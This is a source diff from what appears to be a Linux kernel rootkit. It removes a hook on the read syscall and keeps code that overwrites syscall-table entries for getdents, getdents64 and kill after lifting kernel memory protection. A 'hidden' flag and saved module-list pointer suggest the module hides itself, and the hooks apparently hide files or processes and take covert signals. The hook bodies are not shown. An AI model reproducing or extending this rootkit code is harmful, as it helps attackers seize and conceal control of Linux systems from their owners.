@@ -42,7 +42,6 @@ typedef struct __pid {
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 static t_syscall orig_getdents = NULL;
 static t_syscall orig_getdents64 = NULL;
-static t_syscall orig_read = NULL;
 static t_syscall orig_kill = NULL;
 static short hidden = 0;
 static struct list_head *prev_module;
@@ -377,14 +376,12 @@ static int __init m_init(void)
   }
   orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
   orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
-  orig_read = (t_syscall)__sys_call_table[__NR_read];
   orig_kill = (t_syscall)__sys_call_table[__NR_kill];
 
   unprotect_memory();
 
   __sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
   __sys_call_table[__NR_getdents64] = (unsigned long) my_getdents;
-  __sys_call_table[__NR_read] = (unsigned long)my_read;
   __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
 
 
@@ -402,7 +399,6 @@ static void __exit m_exit(void)
   unprotect_memory();
     __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
     __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-    __sys_call_table[__NR_read] = (unsigned long)orig_read;
     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 
     protect_memory();
